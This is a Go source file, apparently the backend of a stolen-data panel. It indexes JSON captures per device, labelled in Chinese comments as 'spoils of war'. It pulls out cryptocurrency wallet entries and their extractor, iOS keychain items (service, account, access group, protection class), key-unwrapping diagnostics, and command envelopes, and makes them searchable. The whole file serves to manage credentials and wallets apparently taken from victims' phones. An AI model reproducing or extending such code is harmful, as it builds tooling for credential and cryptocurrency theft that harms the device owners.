package store

import (
	"encoding/json"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
)

// 资产索引服务（u / war 战果）：数据包不落任何数据库，只做「扫描 + 提取 + 记录路径」。

var (
	assetMu    sync.Mutex
	assetIndex = map[string]map[string]map[string]any{} // ep -> file -> entry
	assetSeen  = map[string]map[string]bool{}
)

func tsFromName(name string) string {
	parts := strings.SplitN(name, "-", 3)
	if len(parts) < 2 {
		return "-"
	}
	d, t := parts[0], parts[1]
	if len(d) < 8 || len(t) < 6 {
		return "-"
	}
	return d[0:4] + "-" + d[4:6] + "-" + d[6:8] + " " + t[0:2] + ":" + t[2:4] + ":" + t[4:6]
}

func shortS(v any, n int) string {
	s := toStr(v)
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// extractAssetRows 按端点语义提取行；返回 (rows, device_uuid)。
func extractAssetRows(folder string, o map[string]any) ([]map[string]any, string) {
	rows := []map[string]any{}
	lhu := toStr(o["lhu"])
	if lhu == "" {
		lhu = toStr(o["device_uuid"])
	}

	if folder == "u" {
		for _, av := range asAnySlice(o["apps"]) {
			a, _ := av.(map[string]any)
			rows = append(rows, map[string]any{
				"tbl":      "app",
				"bundleId": a["bundleId"],
				"name":     a["name"],
				"uuid":     a["uuid"],
			})
		}
		if o["count"] != nil && len(rows) == 0 {
			rows = append(rows, map[string]any{"tbl": "summary", "bundleId": "count=" + toStr(o["count"])})
		}
		return rows, lhu
	}

	if folder == "war" {
		if wallets, ok := o["wallets"].(map[string]any); ok {
			for pkg, info := range wallets {
				if im, ok := info.(map[string]any); ok {
					tool := im["type"]
					if tool == nil {
						tool = im["extractor"]
					}
					var kv []string
					i := 0
					for k, v := range im {
						if i >= 4 {
							break
						}
						kv = append(kv, k+"="+toStr(v))
						i++
					}
					rows = append(rows, map[string]any{"tbl": "wallet", "bundleId": pkg,
						"tool": tool, "detail": strings.Join(kv, ", ")})
				} else {
					rows = append(rows, map[string]any{"tbl": "wallet", "bundleId": pkg,
						"tool": ".liferay", "detail": toStr(info)})
				}
			}
		}
		kc, _ := o["keychain"].(map[string]any)
		tables, _ := kc["tables"].(map[string]any)
		for tbl, tinfo := range tables {
			ti, _ := tinfo.(map[string]any)
			for _, itv := range asAnySlice(ti["items"]) {
				it, _ := itv.(map[string]any)
				tname := toStr(it["_table"])
				if tname == "" {
					tname = tbl
				}
				ag := it["accessGroup"]
				if ag == nil {
					ag = it["agroup"]
				}
				rows = append(rows, map[string]any{
					"tbl":      tname,
					"bundleId": toStr(ag),
					"service":  it["service"],
					"account":  it["account"],
					"rowid":    it["rowid"],
					"prot":     it["protectionClass"],
					"detail":   "svc=" + toStr(it["service"]) + " acc=" + shortS(it["account"], 24),
				})
			}
		}
		if len(rows) == 0 && (len(tables) > 0 || kc["diagnostics"] != nil) {
			diag, _ := kc["diagnostics"].(map[string]any)
			var parts []string
			for k, v := range tables {
				if m, ok := v.(map[string]any); ok {
					parts = append(parts, k+"="+toStr(m["count"]))
				}
			}
			rows = append(rows, map[string]any{"tbl": "summary",
				"bundleId": "aksReady=" + toStr(diag["aksReady"]) + " unwrapped=" + toStr(diag["metadataKeysUnwrapped"]),
				"detail":   strings.Join(parts, ", ")})
		}
		if o["command_id"] != nil {
			sub := map[string]any{}
			for _, k := range []string{"wallets", "command_id", "source"} {
				if v, ok := o[k]; ok {
					sub[k] = v
				}
			}
			b, _ := json.Marshal(sub)
			d := string(b)
			if len(d) > 160 {
				d = d[:160]
			}
			rows = append(rows, map[string]any{"tbl": "envelope",
				"bundleId": toStr(o["command_id"]), "detail": d})
		}
		return rows, lhu
	}

	return rows, lhu
}

// ScanAssets 增量扫描 capture/<folder>/ 下 json，返回索引行（新→旧）。
func ScanAssets(folder, root string) []map[string]any {
	assetMu.Lock()
	defer assetMu.Unlock()
	ep := assetIndex[folder]
	if ep == nil {
		ep = map[string]map[string]any{}
		assetIndex[folder] = ep
	}
	seen := assetSeen[folder]
	if seen == nil {
		seen = map[string]bool{}
		assetSeen[folder] = seen
	}
	d := filepath.Join(root, folder)
	if entries, err := os.ReadDir(d); err == nil {
		var names []string
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(e.Name(), ".json") {
				names = append(names, e.Name())
			}
		}
		sort.Sort(sort.Reverse(sort.StringSlice(names)))
		for _, name := range names {
			if seen[name] {
				continue
			}
			seen[name] = true
			p := filepath.Join(d, name)
			var apps []map[string]any
			lhu := ""
			if b, err := os.ReadFile(p); err == nil {
				var o map[string]any
				if json.Unmarshal(b, &o) == nil {
					apps, lhu = extractAssetRows(folder, o)
				}
			}
			var size int64
			if fi, err := os.Stat(p); err == nil {
				size = fi.Size()
			}
			ep[name] = map[string]any{
				"file":      name,
				"path":      "capture/" + folder + "/" + name,
				"ts":        tsFromName(name),
				"size":      size,
				"lhu":       lhu,
				"app_count": len(apps),
				"apps":      apps,
			}
		}
	}
	entries := make([]map[string]any, 0, len(ep))
	for _, e := range ep {
		entries = append(entries, e)
	}
	sort.Slice(entries, func(i, j int) bool {
		return toStr(entries[i]["ts"]) > toStr(entries[j]["ts"])
	})
	return entries
}

// QueryAssets 展平 + 关键词过滤 + 分页。
func QueryAssets(folder, root, kw string, page, per int) map[string]any {
	entries := ScanAssets(folder, root)
	allRows := []map[string]any{}
	for _, e := range entries {
		for _, a := range asAnySlice(e["apps"]) {
			am, _ := a.(map[string]any)
			row := map[string]any{}
			for k, v := range am {
				row[k] = v
			}
			row["lhu"] = e["lhu"]
			row["ts"] = e["ts"]
			row["path"] = e["path"]
			row["file"] = e["file"]
			row["size"] = e["size"]
			allRows = append(allRows, row)
		}
	}
	if kw != "" {
		k := strings.ToLower(kw)
		filtered := allRows[:0:0]
		for _, r := range allRows {
			if strings.Contains(strings.ToLower(toStr(r["bundleId"])), k) ||
				strings.Contains(strings.ToLower(toStr(r["service"])), k) ||
				strings.Contains(strings.ToLower(toStr(r["detail"])), k) ||
				strings.Contains(strings.ToLower(toStr(r["lhu"])), k) ||
				strings.Contains(strings.ToLower(toStr(r["tool"])), k) {
				filtered = append(filtered, r)
			}
		}
		allRows = filtered
	}
	start := (page - 1) * per
	if start < 0 {
		start = 0
	}
	end := start + per
	if start > len(allRows) {
		start = len(allRows)
	}
	if end > len(allRows) {
		end = len(allRows)
	}
	return map[string]any{"total_pkgs": len(entries), "total": len(allRows),
		"page": page, "rows": allRows[start:end]}
}
